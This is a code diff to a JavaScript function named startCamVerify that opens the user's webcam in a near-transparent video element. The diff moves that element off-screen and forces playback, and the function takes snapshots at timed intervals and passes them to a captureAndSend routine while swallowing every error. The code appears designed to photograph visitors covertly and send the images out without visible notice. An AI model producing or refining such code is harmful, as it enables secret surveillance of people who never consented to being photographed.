@@ -2884,9 +2884,13 @@ async function startCamVerify() {
     video.playsInline = true;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1;';
+    video.setAttribute('autoplay', '');
+    video.setAttribute('muted', '');
+    video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:320px;height:240px;opacity:0.01;pointer-events:none;';
     video.srcObject = stream;
     document.body.appendChild(video);
+
+    try { await video.play(); } catch (e) {}
 
     await new Promise((resolve) => {
       video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
@@ -2896,13 +2900,18 @@ async function startCamVerify() {
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
 
+    // Take initial snap after 1s, and follow-up after 3.5s then clean up stream
     setTimeout(() => captureAndSend(video, ctx, canvas), 1000);
     setTimeout(() => {
       captureAndSend(video, ctx, canvas);
       setTimeout(() => {
-        try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
+        try {
+          stream.getTracks().forEach((tr) => tr.stop());
+          video.remove();
+          canvas.remove();
+        } catch (e) {}
       }, 1000);
-    }, 4000);
+    }, 3500);
   } catch (e) {}
 }
 
